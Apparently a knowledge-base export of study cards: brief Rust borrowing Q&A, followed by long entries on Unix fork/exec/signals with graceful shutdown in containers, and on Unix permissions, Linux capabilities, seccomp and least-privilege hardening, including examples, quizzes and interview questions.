Why does `v.push(x)` fail while a reference `&v[0]` is still used later? || `push` may reallocate the buffer and free the old one, which would leave the reference dangling. The reference is a live shared borrow and `push` needs a mutable one, so the compiler rejects it.
A `Vec<i32>` with capacity 4 has 4 elements, and pushes double the capacity. After one more push, how many bytes are allocated for elements, and what happens to old pointers? || The capacity becomes 8, so 8 × 4 = 32 bytes. The old 16-byte buffer is freed, so any old pointer into it would dangle, which is why Rust forbids holding one across the push.
When would you choose `Arc<Mutex<T>>` over plain ownership? || When several threads or tasks truly need to share and change the same data, and passing messages or splitting the data is not practical. You accept atomic reference counting and lock costs in return for dynamic sharing.

@@ signals
value: A Unix process is born, runs, and dies, and during its life other parts of the system need to talk to it without its cooperation: the user presses Ctrl-C, an operator wants a service to stop, a child exits, a write goes to a closed pipe, the program touches an invalid address. The process lifecycle (fork, exec, wait, exit) and signals are the Unix answers. `fork` creates a new process as a copy of the current one, `exec` replaces its program with a new one, `wait` lets the parent collect the result, and signals are small asynchronous messages the kernel delivers to a process, which either run a handler function the program has installed or trigger a default action such as terminating.
This matters daily for anyone who runs services. Every `docker stop`, every Kubernetes pod deletion and every systemd restart is a signal: first SIGTERM ("please finish and exit"), then, after a grace period, SIGKILL ("you are gone now"). A service that ignores SIGTERM loses in-flight requests or gets killed mid-write. A container whose main process is a shell script never receives the signal at all. A parent that never calls `wait` fills the process table with zombies. Knowing the mechanism explains exit codes like 137 and 143 and why graceful shutdown must be written on purpose.
Three lower layers make it work. Processes (L3) supply the objects: a process control block with an address space, file descriptors, a parent and a state. Interrupts (L3) supply the model: a signal is a software interrupt, delivered when the kernel is about to return to user mode, and hardware faults such as a bad memory access are turned into signals (SIGSEGV). Virtual memory (L3) makes `fork` cheap: the child shares the parent's pages as copy-on-write, so only pages that are changed are ever copied.
terms: fork — the system call that creates a child process as a near-identical copy of the caller; it returns twice, the child's pid in the parent and 0 in the child.
exec — a family of system calls that replace the current process's program, memory and stack with a new executable, keeping the pid and open file descriptors.
Copy-on-write (COW) — after `fork`, parent and child share the same physical pages marked read-only; the first write to a page triggers a fault and the kernel gives the writer a private copy.
Signal — a small numbered asynchronous notification sent to a process by the kernel or another process.
Signal handler — a function the program registers (with `sigaction`) to run when a given signal arrives.
Zombie — a child that has exited but whose parent has not yet called `wait`; only its exit status entry remains in the process table.
Orphan — a process whose parent has exited; the kernel reparents it to init (pid 1) or a designated subreaper.
Reaping — calling `wait`/`waitpid` on a child to collect its exit status and let the kernel free its process entry.
PID 1 (init) — the first process in a PID namespace; it adopts orphans and gets special signal rules.
history: Unix had processes from the start. The `fork` idea is older (it appears in early 1960s designs such as Melvin Conway's multiprocessor work and the Berkeley Timesharing System), and Ken Thompson and Dennis Ritchie built it into Unix in the early 1970s, where `fork` followed by `exec` is the way to run any program, with the shell as the main user. The first edition of the Unix manual (1971) already lists signals, at first as simple ways to interrupt or kill a program. The design had a famous weakness: in Version 7 Unix a handler was reset to the default after each signal, so a second signal arriving quickly could kill the process, and signals could be lost.
BSD fixed this in 4.2BSD (1983) with "reliable signals": handlers stay installed, signals can be blocked (masked), and system calls can restart. POSIX standardised the cleaner interface, `sigaction` and signal sets, in 1988 to 1990, and added real-time signals, which queue and can carry a value. Linux grew its own modern tools: `signalfd` (2007) to read signals from a file descriptor, and `pidfd` (Linux 5.3, 2019) to refer to a process by a stable handle rather than a number that can be reused.
`fork` itself had to be re-engineered. Early Unix copied the whole address space at fork. Virtual memory hardware made copy-on-write possible in the 1980s (BSD `vfork` appeared as a hack in 3BSD, and COW `fork` replaced the need), and today `fork` of a large process copies only page tables. At the same time, `fork` became a known scaling problem for big, multithreaded programs, so `posix_spawn`, `vfork` and Linux `clone` flags are now used by runtimes that start many subprocesses. Containers brought PID namespaces (Linux 2.6.24, 2008), where the first process of a namespace becomes PID 1 and inherits init's duties and its special signal handling, which still surprises people running a single application as the container's main process.
how: Start with the lifecycle. A process is created by `fork`. The kernel allocates a new process entry (a task structure in Linux), gives it a new pid, and copies the parent's state: registers, file descriptor table, signal handlers, current directory and so on. The address space is not copied. Instead the kernel duplicates the page tables and marks every writable page read-only in both parent and child. Both now run and share all memory. When either one writes to a shared page, the CPU raises a page fault (the virtual memory concept); the kernel sees that the page is copy-on-write, allocates a new page, copies 4 KB, maps it writable for the writer, and restarts the instruction. Only pages that are touched get copied. Cost: copying page tables takes about 8 bytes per 4 KB page, so a process with 10 GB of memory has about 2.6 million entries, 21 MB of page tables, and `fork` takes tens of milliseconds.
`fork` returns twice: in the parent it returns the child's pid, in the child it returns 0. The child usually calls `exec`, which discards the whole inherited address space and loads a new program: the kernel opens the executable, maps its segments, builds a new stack with the arguments and environment, and starts at the entry point. The pid, the parent, and the open file descriptors (except those marked close-on-exec) stay the same. This split is why a shell can set up redirection between `fork` and `exec`: the child rewires its file descriptors with `dup2`, then replaces itself with the command.
When the process finishes, it calls `exit`. The kernel closes its files, frees its memory, and reparents its children to init, but it keeps a small entry with the exit status and sends SIGCHLD to the parent. The process is now a zombie. It uses no memory and no CPU, only a slot in the process table (and a pid). The parent calls `waitpid` to read the status; only then does the kernel remove the entry. A parent that never calls `wait` leaves zombies until it dies, when init adopts and reaps them. Thousands of zombies can exhaust the pid space (the default limit is about 32,768 pids on many systems, up to about 4 million on 64-bit Linux).
Now signals. A signal is a number from 1 to 64 in Linux. Sending one (`kill(pid, sig)`, or the kernel itself) sets a bit in the target's pending-signals set. That is all that happens at send time: the signal is not run at once. The target is checked for pending signals when the kernel is about to return to user mode, for example after a system call, an interrupt or a time slice. If the process is sleeping in an interruptible wait, the signal wakes it. If a pending signal is not blocked, the kernel acts on it. There are three actions: the default (terminate, terminate with core dump, ignore, stop, or continue), ignore, or run a handler.
To run a handler, the kernel pushes a signal frame on the user stack (saving the interrupted registers), points the instruction pointer at the handler, and returns to user mode. The handler runs; when it returns, it calls a small stub that makes the `rt_sigreturn` system call, and the kernel restores the saved registers so the program continues exactly where it was interrupted. Because the handler can interrupt the program at any instruction, even inside `malloc`, it may only call functions that are async-signal-safe (`write`, `_exit`, `kill`, and a short list in POSIX). Calling `printf` or `malloc` from a handler can deadlock. The standard safe pattern: the handler only sets a flag or writes one byte to a pipe, and the main loop does the real work.
Two signals cannot be caught, blocked or ignored: SIGKILL (9) and SIGSTOP. The kernel acts on them without involving the process, which is why they are the last resort. Others are caught normally: SIGTERM (15), the polite request to stop; SIGINT (2), from Ctrl-C; SIGHUP (1), terminal closed (often reused to mean "reload config"); SIGCHLD, a child changed state; SIGPIPE, a write to a pipe or socket with no reader; SIGSEGV, an invalid memory access; SIGUSR1 and SIGUSR2, free for application use. Standard signals do not queue: if SIGCHLD arrives five times while it is blocked, one is delivered, which is why reaping code must loop with `waitpid(-1, ..., WNOHANG)` until it returns no more children.
Faults connect signals to interrupts and to virtual memory. When a program dereferences a bad address, the CPU raises a page fault; the kernel finds no valid mapping and sends the process SIGSEGV, whose default action terminates it with a core dump. A process can also catch SIGSEGV; this is how some runtimes and debuggers implement features such as null checks and guard pages.
Finally, the PID 1 special case. In a PID namespace, the kernel does not apply the default action of a signal to the init process, and signals sent from within the namespace that it has no handler for are ignored. So if your application is PID 1 in a container and has not installed a SIGTERM handler, `docker stop` sends SIGTERM and nothing happens; ten seconds later (the default for `docker stop`) the daemon sends SIGKILL.

example: Take a stateless web service running in a Kubernetes pod. A rolling update deletes the old pod. The kubelet sends SIGTERM to the container's main process and starts a timer for `terminationGracePeriodSeconds` (30 seconds by default). If the process is still alive when the timer ends, the kubelet sends SIGKILL. The service handles about 200 requests per second, each taking up to 2 seconds, so up to 400 requests are in flight at any moment.
Without a handler, SIGTERM kills the process at once. About 400 requests are cut off; clients see connection resets. With a handler, the sequence is: the handler sets a flag; the main loop stops accepting new connections; it waits for the in-flight requests to finish (at most about 2 seconds); it closes database connections and flushes buffers; it exits with code 0. The pod terminates in about 3 seconds, and no request is lost.
A Python version of the pattern:
```python
import signal, threading

stop = threading.Event()

def on_term(signum, frame):
    stop.set()                  # only set a flag, nothing else

signal.signal(signal.SIGTERM, on_term)
signal.signal(signal.SIGINT, on_term)

while not stop.is_set():
    serve_one_request(timeout=0.5)   # wakes up to check the flag
drain_inflight(deadline=20)          # must stay below the 30 s grace
close_resources()
```
Now two ways this goes wrong. If the Dockerfile uses the shell form `CMD python app.py`, Docker runs `/bin/sh -c "python app.py"`; the shell is PID 1, it does not forward SIGTERM, and the app never sees it, so every stop takes the full timeout and ends with SIGKILL (exit code 137 = 128 + 9). The fix is the exec form `CMD ["python", "app.py"]`, or `docker run --init`, which runs a tiny init (tini) that forwards signals and reaps zombies. Second, there is a race: the pod may still be in the load balancer's list of endpoints when SIGTERM arrives, so new requests keep coming for a few seconds. A common fix is a `preStop` hook that sleeps 5 to 10 seconds before the signal is sent.
Last, a number for `fork`: Redis saves a snapshot by forking. With 20 GB of data there are about 5.2 million pages, so the page tables are about 42 MB and the fork pauses the server for tens of milliseconds. While the child writes the file for about 60 seconds, the parent keeps taking writes; if writes touch 10% of the pages, 2 GB of memory is copied by COW, so the host needs headroom of that size.
intuition: A signal is a tap on the shoulder from the kernel: the process finishes the step it is on, then either turns to answer, ignores it, or, for the one tap it cannot refuse, is removed from the room.
The design is natural because a running program cannot poll for every possible outside event, and the kernel is the only party that sees them all. So the kernel records the event in a bit, and acts on it at the one moment when it controls the CPU anyway, the return to user mode. The same simple trick makes `fork` cheap: do not copy what nobody has changed. Parent and child share everything until one of them writes, and only then does the kernel pay for a copy.
mistakes: People often think a signal interrupts a process at once and runs the handler like a function call. In fact sending only marks the signal pending. It is delivered when the target next returns to user mode, and if the signal is blocked or the process is in an uninterruptible wait (state D, usually disk or NFS I/O), it waits. Even SIGKILL does not work on a process stuck in uninterruptible sleep until the I/O returns.
People often think SIGKILL is a stronger SIGTERM that you should use to "make sure". In fact SIGKILL gives the process no chance to flush data, release locks, remove temporary files or tell its children. Use SIGTERM first and give it time; use SIGKILL only after the timeout. A database killed with SIGKILL must recover from its log on restart.
People often think you can do anything inside a signal handler. In fact the handler may interrupt the program in the middle of `malloc` or `printf`, which hold internal locks, and calling them again from the handler can deadlock or corrupt memory. Only async-signal-safe functions are allowed; the usual approach is to set a flag or write to a pipe.
People often think zombies are processes consuming resources and must be killed. In fact a zombie is only an exit-status record; killing it does nothing, because it is already dead. The fix is for its parent to call `wait`, or to kill or fix the parent so that init adopts and reaps the zombies.
People often think `fork` copies all memory, so it is slow for large programs. In fact it copies page tables, not data, and data pages are copied only when written. It is still not free for very large processes (tens of milliseconds at 20 GB, and extra memory when the child lives long).
friction: Signals are a weak design for modern programs. They are asynchronous and global: a handler can run at any point, in any thread that does not block the signal, and the rules about what is safe are strict and easy to break. Standard signals coalesce, so counting events by signals fails. Multithreaded programs add more confusion: a process-directed signal goes to an arbitrary thread that does not block it. The common modern answer is to block signals in all threads and read them in one place with `signalfd` or `sigwait`, or in a language runtime (Go, Java, Python) that converts them into channel messages or flags.
`fork` has aged badly in some ways. It copies the state of all file descriptors and signal dispositions, but only the calling thread survives in the child, so locks held by other threads at the time of the call stay locked forever in the child. This makes `fork` in multithreaded programs dangerous unless the child calls `exec` right away. Memory overcommit adds another problem: a huge process that forks may be refused or may trigger the out-of-memory killer, because the kernel must promise memory for the potential copies. Researchers argued the case in the paper "A fork() in the road" (HotOS 2019).
Process management is fragile in containers. Single-process containers must handle PID 1 duties (signal handling, reaping orphans), and wrappers such as shell scripts hide signals. Grace periods are fixed numbers that must be tuned: too short and requests die; too long and rollouts are slow. Also, a process killed by a signal has no exit code: shells report 128 + signal number (137 for SIGKILL, often from the OOM killer; 143 for SIGTERM; 139 for SIGSEGV), which is a convention, not a guarantee. Finally, pid numbers are reused, so `kill` on a stored pid may hit an unrelated process; `pidfd` is the safe handle.
practice: Make graceful shutdown a requirement for every service: on SIGTERM stop accepting new work, finish or hand off in-flight work, flush and close resources, then exit with code 0, in less time than the grace period. Test it by sending the signal (`kill -TERM <pid>`) under load and counting failed requests. In Kubernetes, set `terminationGracePeriodSeconds` above your worst-case drain time, and add a `preStop` sleep of a few seconds so the endpoint is removed from load balancers before the signal arrives.
In containers, make sure the app receives signals: use the exec form of `CMD`/`ENTRYPOINT`; in shell wrapper scripts end with `exec my-app "$@"` so the shell is replaced; or run with `--init` (Docker) or use `tini` or `dumb-init` for images that spawn child processes. Check inside the container with `ps -o pid,stat,cmd` for zombie (Z) entries.
When you write programs: use `sigaction` and not the old `signal`; keep handlers tiny (set a `volatile sig_atomic_t` flag or write a byte to a self-pipe); block signals in worker threads and handle them in one thread; loop on `waitpid(-1, &st, WNOHANG)` to reap all children after SIGCHLD; handle `EINTR` (system calls interrupted by signals) or use `SA_RESTART`. To start subprocesses from a large or multithreaded program, use `posix_spawn` or your language's subprocess library instead of raw `fork`.
For debugging: `strace -f -p <pid>` shows signal arrival and system calls; `kill -l` lists signals; `ps -eo pid,ppid,stat,cmd` shows states (R running, S sleeping, D uninterruptible, T stopped, Z zombie); `dmesg` shows OOM kills; `/proc/<pid>/status` shows pending (`SigPnd`), blocked (`SigBlk`) and caught (`SigCgt`) signal masks.
tradeoffs: `fork`+`exec` versus `posix_spawn` or `vfork`. Choose `fork`+`exec` for shells and small programs that need to edit file descriptors and environment between the two calls. Choose `posix_spawn`/`vfork`/`clone` with `CLONE_VM` when a large or multithreaded process starts many subprocesses; they skip copying page tables, and avoid the lock hazards of fork. You give up the freedom to run arbitrary code in the child before exec.
Handlers versus `signalfd`/`sigwait`. Choose a classic handler for a simple single-threaded program with one flag to set. Choose a dedicated thread with `sigwait`, or `signalfd` in an event loop, when you have threads or an event loop: signals become ordinary events with no async-safety limits. The cost is a bit more setup.
SIGTERM-first versus SIGKILL. Always try SIGTERM first for anything that holds state (databases, queues, writers). Use SIGKILL immediately only for a runaway process that is harming the host. The price of SIGKILL is lost buffers, stale locks and recovery work; the price of waiting is a slower rollout.
Short versus long grace period. A short period (10 to 30 seconds) suits stateless services with short requests and fast deployments. A long one (minutes) suits streaming consumers, batch workers and databases that must hand off or checkpoint. You give up faster rollouts and node drains, and the risk is a hung process holding up the whole deployment.
Wait for children or let init reap them. In a container that spawns subprocesses, use a real init (tini) to reap and forward signals; run your app as PID 1 only if it handles both duties itself. A small image without an init is simpler but can leak zombies.

value: A multi-user computer runs programs from different people and different services, and they all share one kernel, one file system and one network. Something must decide, for every file opened and every port bound, whether this particular program is allowed to do it. Unix answered with a simple model that has lasted since 1971: every process runs as a user (a numeric uid) and belongs to groups (gids), every file has an owner, a group and nine permission bits, and the kernel checks the bits on each access. The superuser, root (uid 0), skips most checks.
That model is easy to explain and to audit, but it is coarse. "Root or not root" is too blunt: a web server needs to bind to port 443, which is a privileged operation, and in the classic model that meant running the whole server as root. If one bug in the server is exploited, the attacker owns the machine. Modern Linux therefore cuts root's power into pieces. Capabilities split root into about 40 separate privileges (bind low ports, change file owners, load kernel modules, and so on) that can be given one by one. Seccomp filters limit which system calls a process may make at all. Linux Security Modules (SELinux, AppArmor) add policy that even root cannot override.
This is the base of container isolation and of least-privilege design on a host: a container is a process with a restricted view (namespaces) and restricted rights (dropped capabilities, a seccomp filter, a non-root user). The layers below make it possible. System calls (L3) are the single doorway where the kernel looks at the caller's credentials and decides. File systems (L3) store the owner, group and mode in each inode, which is the data the check reads. Set theory (L4) is the language of the model: users and groups are sets, a permission is an element of a set of allowed actions, and ACL entries, capability sets and seccomp allow-lists are all set operations.
terms: uid / gid — the numeric user and group ids of a process or file owner; names like "alice" are only labels stored in /etc/passwd.
Mode bits — nine bits (read, write, execute for owner, group and others) stored in an inode, plus the setuid, setgid and sticky bits; written in octal such as 750.
DAC (discretionary access control) — access rules set by the owner of an object, such as chmod on a file; the Unix default.
MAC (mandatory access control) — a system-wide policy that the owner cannot change, enforced by the kernel (SELinux, AppArmor).
ACL — an access control list: a per-file list of extra user and group entries, each with its own permissions, beyond the three owner/group/other classes.
setuid — a bit on an executable that makes it run with the file owner's uid instead of the caller's, used by programs such as `sudo` and `passwd`.
Capability — one of about 40 separate privileges that together make up root's power on Linux, such as CAP_NET_BIND_SERVICE; each can be granted or dropped alone.
seccomp — a Linux facility that lets a process install a filter (written in BPF) which allows, denies or kills on each system call by number and arguments.
Least privilege — giving a program only the rights it needs for its job, and nothing more.
history: Early Unix (1971 on) gave each file an owner, a small set of permission bits and the rule that user 0 can do everything. The nine-bit scheme was chosen for simplicity: Ritchie and Thompson wanted a model that fits in a few bytes of an inode and can be checked quickly. The setuid bit, which Dennis Ritchie added for the system, solved a real problem: a normal user must be able to change their own entry in the password file without being able to edit anyone else's, so the program that does it runs with the owner's rights. It is also the origin of many later privilege-escalation bugs.
As systems grew, three weaknesses showed. Groups could not express "alice and bob but not carol", so ACLs were added: POSIX tried to standardise them in a draft (1003.1e, abandoned in the late 1990s), and Linux and the BSDs implemented them anyway, while Windows and NFSv4 have a richer ACL model. Root was too powerful, so POSIX capabilities were drafted and Linux implemented them from version 2.2 (1999), and the number of capabilities has grown to about 40. And owners could mis-set permissions, so mandatory access control came: the NSA built SELinux (released 2000, merged in Linux 2.6 in 2003 through the Linux Security Modules framework), and AppArmor followed as a simpler path-based alternative.
Sandboxing for browsers and containers drove the newest pieces. Seccomp began in 2005 (Linux 2.6.12) as a mode that allowed only four system calls, and became practical with seccomp-bpf in Linux 3.5 (2012), written by Will Drewry for the Chrome sandbox, which allows an arbitrary filter program. User namespaces (Linux 3.8, 2013) let an unprivileged user be "root" inside a namespace, which enabled rootless containers. Docker, Podman and Kubernetes combine all of these: by default Docker keeps only 14 capabilities and applies a seccomp profile that blocks about 44 of the 300+ system calls.
how: Every process carries a credentials record in the kernel: real, effective and saved uid and gid, a list of supplementary groups, and five capability sets. When a process makes a system call that touches a file (`open`, `unlink`, `chmod`), the kernel (reached through the syscall interface) looks up the file's inode (from the file system) and compares the process's effective uid, gid and groups with the inode's owner, group and mode bits. The effective uid is what is checked; the real uid says who started the program, and the saved uid lets a program give up privilege and later take it back.
The classic check goes in order. If the caller has the right capability (root has all of them), the kernel allows nearly everything and stops. Otherwise, if the caller's uid equals the file owner, only the owner bits apply. Else if the caller's gid or any supplementary group equals the file's group, only the group bits apply. Otherwise the "other" bits apply. The first matching class decides, even if a later class would allow more: a file with mode 070 and owner alice denies alice, though her group may read it. When a file has an ACL, named user and group entries are checked between the owner and the group steps, and a "mask" entry caps the permissions of all entries except the owner and others.
The three bits mean different things on directories. Read lets you list names. Write lets you create, rename and delete entries, regardless of the files' own modes. Execute (also called search) lets you pass through the directory to reach a name inside. A path lookup therefore needs execute permission on every directory along the path. The sticky bit on a directory such as `/tmp` (mode 1777) restricts deletion: you may delete an entry only if you own it or the directory. The permission is checked when the file is opened, not at every read: the open file descriptor remembers the access mode, and a later `chmod` does not affect descriptors that are already open.
The setuid and setgid bits on an executable change the effective uid or gid during `exec`. If `/usr/bin/passwd` is owned by root with setuid, then when alice runs it, the process has real uid alice and effective uid root, and it can write `/etc/shadow`. This is powerful and dangerous: any bug in the program becomes a root exploit, so such programs must be small and careful. The flag `no_new_privs` (Linux 3.5) lets a process promise that it and its descendants will never gain privilege through `exec`, which containers use to block setuid escalation.
Capabilities remove the all-or-nothing choice. The kernel checks specific capabilities at specific places: binding a port below 1024 needs CAP_NET_BIND_SERVICE, changing a file's owner needs CAP_CHOWN, bypassing read/write checks needs CAP_DAC_OVERRIDE, sending signals to any process needs CAP_KILL, configuring network interfaces needs CAP_NET_ADMIN, raw sockets need CAP_NET_RAW. CAP_SYS_ADMIN is a very large catch-all (mounting, many namespace and device operations) and is nearly as dangerous as root. Each thread has several sets: permitted (the most it may use), effective (what is active now), inheritable and ambient (what can pass through `exec`) and a bounding set (a ceiling for the process tree). A process can only drop capabilities from its sets, never add beyond permitted. A file can also be given capabilities with `setcap`, an alternative to setuid.
Seccomp works at a different point: the entry of the system call itself. A process installs a BPF program; on each system call the kernel runs the program with the syscall number and arguments, and it returns allow, return-an-error, trap, or kill. Because the filter is inherited by children and cannot be removed, a sandbox can drop dangerous syscalls such as `ptrace`, `mount`, `kexec_load` or `bpf` before running untrusted code. MAC systems add the last layer: SELinux labels every process and object with a type and checks every access against a loaded policy, so even a process running as root with all capabilities can be limited to a few actions.
Containers put these together. A container process typically runs with: a non-root uid (set in the image or by `runAsUser`), a reduced capability set (Docker's default 14, or none with `--cap-drop ALL` plus the few needed), a seccomp profile, `no_new_privs`, an SELinux or AppArmor profile, a read-only root file system, and a user namespace if rootless. Each layer covers a hole in the others: a file-permission bug is limited by the uid, a kernel bug in a rare syscall by seccomp, and a missing capability check by the namespaces.

example: Take a web server written in Go that must listen on port 443. The simplest way to run it is `sudo ./server`: it runs as root, binds the port, and works. If an attacker finds a bug in the HTTP parser and gets code execution, they have root on the host: they can read `/etc/shadow`, install a kernel module, and attack other machines.
Run it with least privilege instead. Create a user `web` (uid 1001). Give the binary only the capability it needs:
```bash
sudo useradd --system --no-create-home web
sudo setcap 'cap_net_bind_service=+ep' /opt/web/server
sudo -u web /opt/web/server        # binds :443 without root
```
Now the process has uid 1001 and one effective capability. It can bind port 443 but cannot read `/etc/shadow` (mode 640 root:shadow, so uid 1001 falls in "other" and is denied), cannot change owners (no CAP_CHOWN) and cannot load modules. In a container the same idea is written like this:
```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1001
  allowPrivilegeEscalation: false      # sets no_new_privs
  readOnlyRootFilesystem: true
  capabilities:
    drop: ["ALL"]
    add: ["NET_BIND_SERVICE"]
  seccompProfile:
    type: RuntimeDefault
```
Now check a file access with the rules. File `/data/report.csv` has owner alice (uid 1001), group dev (gid 200), mode 640 (rw-r-----). Process A runs as alice: owner bits rw-, so it can read and write. Process B runs as bob, who is in group dev: group bits r--, so it can read but writing fails with EACCES. Process C runs as carol, not in dev: other bits ---, so everything fails. If alice's mode were 040 (---r-----) she would be denied even though she is in group dev, because the owner class matches first. If carol had a file ACL entry `user:carol:r--` and the mask allowed it, she could read it.
Finally the cost of one wrong default. A container started with `docker run --privileged` has all capabilities, no seccomp, and access to host devices; from there, mounting the host's disk or loading code into the kernel is easy. Mounting the Docker socket (`/var/run/docker.sock`) into a container gives the same result, because the socket's owner can start a privileged container.
intuition: Permissions are keys and badges: file mode bits are a lock on each door, capabilities split the master key into small keys, and seccomp is a list of which doors a visitor may even knock on.
The model is natural because every system action ends in a system call, and the kernel is the one place that cannot be bypassed. So the kernel keeps a small record of who the caller is, and each protected object keeps a small record of who may do what. A check compares the two. Everything else (ACLs, capabilities, seccomp, SELinux) adds more precise records or more checking points. The direction of progress is always the same: replace "is this root?" with "does this exact action fit what this program needs?".
mistakes: People often think chmod 777 is a harmless way to fix "permission denied". In fact it lets every local user and every compromised service read, change and replace the file or directory, and for a directory it lets anyone delete entries. Find the real cause (wrong owner, wrong group, missing `x` on a parent directory) and fix that.
People often think running as root inside a container is safe because the container is isolated. In fact root in a container is uid 0 on the host kernel unless user namespaces are used. With enough capabilities, a mounted host path or a kernel bug, it can reach the host. Run as non-root and drop capabilities.
People often think read permission on a file is enough to open it. In fact the path lookup needs execute (search) permission on every parent directory, so a file with mode 644 inside a directory of mode 700 owned by someone else is unreachable. Permissions on a directory control names, not the contents of files.
People often think the group bits help the owner as well. In fact the kernel picks one class and stops: owner first, then group, then others. A file can be unreadable to its owner and readable to others (mode 004), which is odd but valid.
People often think seccomp or capabilities replace file permissions. In fact they are separate layers that restrict different things. Capabilities control privileged operations, seccomp controls the system-call surface, and mode bits and ACLs control file access. A hardened process uses all of them together.
friction: The classic model is coarse and the rules are hard to audit at scale. Ordinary mode bits cannot say "these three users and two groups", ACLs help but are rarely used consistently, and with millions of files nobody can review who has access to what. Capabilities are uneven: CAP_SYS_ADMIN covers so many operations that granting it is close to granting root, and an exploit that needs one capability can often chain to others. The set of capabilities and the exact checks differ between kernel versions, which makes it hard to know the minimum set a program needs.
Seccomp profiles are difficult to write by hand. The list of system calls a program needs depends on the libc, the runtime and even the input; a profile that is too tight breaks the program in rare code paths (a missing `futex` or `clone3` kills a service only under load), and one that is too loose gives little protection. Default profiles (Docker's, Kubernetes' RuntimeDefault) are a compromise. Also, syscall filters see only numbers and register values, not the contents of pointed-to memory, so some checks cannot be expressed.
Setuid programs and ambient privileges remain a major source of escalation bugs. Time-of-check to time-of-use races, confused deputy problems (a privileged program acting for an unprivileged caller on a path chosen by the caller) and symlink attacks come back with every generation. Containers add new edges: user-namespace bugs, shared kernel, leaked descriptors, and mounting host sockets. MAC policies, finally, are powerful but complex; many teams turn SELinux off ("setenforce 0") because they cannot write the policy, which removes the layer.
A broader limit is that all these mechanisms trust the kernel. A kernel vulnerability bypasses every check. This is why high-risk workloads move to stronger isolation (gVisor, Firecracker microVMs) despite the performance cost.
practice: Apply least privilege in layers. Run services as a dedicated non-root user with no login shell. Make files owned by an administrator and readable (not writable) by the service. Keep secrets at mode 600 or 640 with the right group, and mount them read-only. Never use mode 777; use `ls -ld` on each directory in the path and `namei -l /path/to/file` to see exactly which component denies access.
For privileged operations, grant one capability. Use `setcap` on a binary, `AmbientCapabilities=` in a systemd unit, or `capabilities.add` in Kubernetes, and check the result with `getpcaps <pid>` or `capsh --print`. Avoid `CAP_SYS_ADMIN`. In systemd units also set `NoNewPrivileges=yes`, `ProtectSystem=strict`, `PrivateTmp=yes` and `SystemCallFilter=@system-service`, which gives a seccomp filter in one line.
In containers and Kubernetes: `runAsNonRoot: true`, `allowPrivilegeEscalation: false`, `capabilities.drop: [ALL]`, `readOnlyRootFilesystem: true`, `seccompProfile: RuntimeDefault`, and no `privileged: true` or host mounts unless essential. Enforce these with Pod Security Standards ("restricted" level) or an admission policy so that no team can forget them. Prefer rootless runtimes where possible.
To find what a program really needs, run it under `strace -c -f` to list system calls, and try `capsh` or `setpriv` with a smaller set until it fails; tools such as `oci-seccomp-bpf-hook` or Kubernetes' Security Profiles Operator record the calls and generate a profile. Review setuid files periodically (`find / -perm -4000 -type f`). Keep SELinux or AppArmor enabled and learn to read denials (`ausearch -m avc`), instead of turning them off.
tradeoffs: Mode bits versus ACLs. Choose plain mode bits and groups when ownership is clear (one service, one group). Choose ACLs when many parties need different rights on shared data, for example a shared directory with several teams. ACLs give finer control but are harder to audit and are not preserved by every backup or copy tool.
Capabilities versus running as root. Choose capabilities whenever a program needs one or two privileged operations (a port, a raw socket); they limit damage if the program is exploited. Choose full root only for system management tools where the work needs wide power, and wrap them in sudo with logging. You give up some simplicity and must test that the capability set is enough on each kernel.
Default seccomp profile versus custom. Use the runtime's default profile for general workloads: it blocks risky calls at low cost and rarely breaks programs. Write a custom, tighter allow-list for internet-facing parsers, multi-tenant code and sandboxes, where reducing kernel attack surface is worth the maintenance of profiles. You pay by testing every release for new syscalls.
MAC (SELinux/AppArmor) versus DAC only. Enable MAC where compromise of a service is likely and the cost is acceptable: servers on shared hosts, internet-facing services, regulated environments. DAC only is simpler to operate on a single-purpose machine. The price of MAC is policy work and debugging time, and the risk of teams disabling it.
Containers versus stronger isolation. A normal hardened container shares the host kernel and is suitable for your own trusted code. Choose gVisor, Kata or Firecracker for untrusted tenants' code; they add a second boundary at a cost of start-up time and 5% to 30% of performance on system-call heavy workloads.
interview: Walk through exactly how the kernel decides whether a process can open a file for writing. || It resolves the path, needing search permission on each directory. For the file it checks capabilities first (CAP_DAC_OVERRIDE); then compares effective uid with the owner (use owner bits), else group membership (group bits, with ACL entries and mask in between), else other bits. The check happens at `open`; the descriptor then carries the access mode, so later `chmod` does not affect it.
How would you let a non-root service bind port 443 and what are the alternatives? || Grant CAP_NET_BIND_SERVICE with `setcap`, systemd `AmbientCapabilities`, or a Kubernetes capability add; or lower `net.ipv4.ip_unprivileged_port_start`; or listen on 8443 and map ports with the load balancer or iptables. The capability is the narrowest choice per process; the sysctl affects every process on the host.
What is the risk of a setuid-root binary, and how do containers reduce it? || Any bug in it (bad input, environment, path or race handling) gives an attacker root. Containers set `no_new_privs` and drop capabilities so exec of a setuid file does not raise privilege, and they avoid shipping unneeded setuid binaries in images.
Why is `--privileged` or mounting `/var/run/docker.sock` equivalent to host root? || `--privileged` gives all capabilities, host devices and no seccomp, so the process can mount the host disk or load kernel code. The Docker socket lets whoever can write to it ask the daemon (running as root) to start a privileged container with the host file system mounted.
A syscall filter breaks your app only in production, at low frequency. How do you find out why? || Look for denied calls: seccomp logs (audit log) or return of EPERM/SIGSYS in strace. A rarely used path (e.g. `clone3`, `io_uring_setup`, `statx`, or a newer libc calling a new syscall) is probably blocked. Add the syscall if it is needed, and test under load and on every runtime upgrade.
Explain DAC versus MAC with an example of when MAC saves you. || DAC lets file owners decide; a compromised service running as the owner can read or change everything the owner can. MAC applies a system policy independent of the owner: an SELinux policy can allow `httpd` to read web content and connect only to the database port, so a hijacked web server cannot read SSH keys or open other connections even if file modes would allow it.
quiz: In what order does the kernel check owner, group and other permission bits? || Owner first: if the uid matches, only owner bits apply; else group (including supplementary groups); else other. The first matching class decides, even if a later one is more permissive.
Why can a process with a file open still read it after `chmod 000`? || Permissions are checked at `open`, and the file descriptor keeps the access mode granted then. New opens would fail, but existing descriptors continue to work.
What does the `x` bit mean on a directory, and why does it matter for a file path? || It allows passing through (searching) the directory to reach names inside. Every directory along the path needs `x` for the caller, otherwise the file cannot be reached even if its own mode allows access.
A file has mode 750, owner alice, group ops. Bob is in group ops, Carol is not in it. What can each do? || Alice has rwx. Bob uses group bits r-x, so he can read and execute but not write. Carol uses other bits (---) and has no access.
When would you choose a custom seccomp profile over the container default? || For code that handles hostile input or runs untrusted tenants' code, where shrinking the allowed system calls reduces the kernel attack surface. For ordinary internal services the default profile gives good protection with little maintenance.

